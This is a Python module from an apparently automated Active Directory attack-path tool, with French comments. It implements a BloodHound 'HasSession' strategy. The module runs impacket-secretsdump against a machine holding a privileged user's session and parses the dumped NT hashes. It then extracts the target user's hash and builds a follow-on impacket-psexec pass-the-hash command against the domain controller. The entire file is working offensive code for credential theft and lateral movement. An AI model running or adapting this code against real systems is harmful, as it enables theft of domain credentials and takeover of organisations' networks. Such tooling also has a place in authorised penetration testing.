import subprocess
from dataclasses import dataclass

from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_done
from references.cred_store import enrich_creds


@dataclass
class HasSessionStrategy(ExploitStrategy):
    """
    HasSession — Un utilisateur privilégié a une session active sur la machine.
    On dump LSASS via impacket-secretsdump sur cette machine pour voler ses credentials.

    Direction BloodHound : Machine --HasSession--> User
        edge.source_node = machine où tourne la session
        edge.goal_node   = utilisateur dont on veut voler les credentials
    """

    edge: Edge

    @property
    def attacker(self) -> Node:
        return self.edge.source_node  # machine sur laquelle on dump

    @property
    def target(self) -> Node:
        return self.edge.goal_node  # utilisateur dont on veut le hash

    # ── Interface ExploitStrategy ─────────────────────────────────────────────

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.HAS_SESSION

    def exploit(self, creds: dict) -> ExploitResult:
        creds = enrich_creds(creds)
        print_check(
            f"HasSession: dump LSASS sur {self.attacker.label} "
            f"──▶ vol credentials de {self.target.label}"
        )
        return self._run_secretsdump(creds)

    # ── Technique ─────────────────────────────────────────────────────────────

    def _run_secretsdump(self, creds: dict) -> ExploitResult:
        dc_ip    = creds["dc_ip"]
        domain   = creds["domain"]
        username = creds["username"]
        secret   = creds.get("secret", "")
        hashes   = creds.get("hashes")

        machine      = self.attacker.label
        target_user  = self.target.label
        target_short = target_user.split("@")[0].upper()

        if hashes:
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}@{machine}",
                "-target-ip", dc_ip,
                "-hashes", hashes,
            ]
        else:
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}:{secret}@{machine}",
                "-target-ip", dc_ip,
            ]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = proc.stdout + proc.stderr
        except subprocess.TimeoutExpired:
            raise HopFailedError(self.edge, "secretsdump timeout (30s)")
        except FileNotFoundError:
            raise HopFailedError(self.edge, "impacket-secretsdump introuvable dans le PATH")

        all_hashes = [
            line.strip()
            for line in output.splitlines()
            if ":::" in line and not line.startswith("[")
        ]

        if not all_hashes:
            raise HopFailedError(
                self.edge,
                f"secretsdump ran but aucun hash trouvé — output:\n{output}"
            )

        # Cherche spécifiquement le hash de l'utilisateur cible
        target_line = next(
            (h for h in all_hashes if target_short in h.upper()), None
        )
        nt_hash = target_line.split(":")[3] if target_line and target_line.count(":") >= 3 else ""

        print_done(
            f"HasSession OK — {len(all_hashes)} hash(es) dumpé(s)"
            + (f", {target_user} NT hash: {nt_hash}" if nt_hash else " (utilisateur cible non trouvé en mémoire)")
        )

        return ExploitResult(
            technique="HasSession (secretsdump LSASS dump)",
            edge=self.edge,
            success=True,
            notes=(
                f"Session active de {target_user} trouvée sur {machine}\n"
                f"  Target hash : {target_line or 'non trouvé en mémoire'}\n"
                f"  Total hashes: {len(all_hashes)}"
            ),
            next_command=(
                f"impacket-psexec {domain}/{target_user} -hashes :{nt_hash} @{dc_ip}"
                if nt_hash else "# Réutiliser un autre hash de all_hashes"
            ),
            cleanup_command="# Aucun artefact persistant — dump mémoire uniquement",
            gained_access=Credential(
                username=target_user,
                password=None,
                nt_hash=nt_hash or None,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )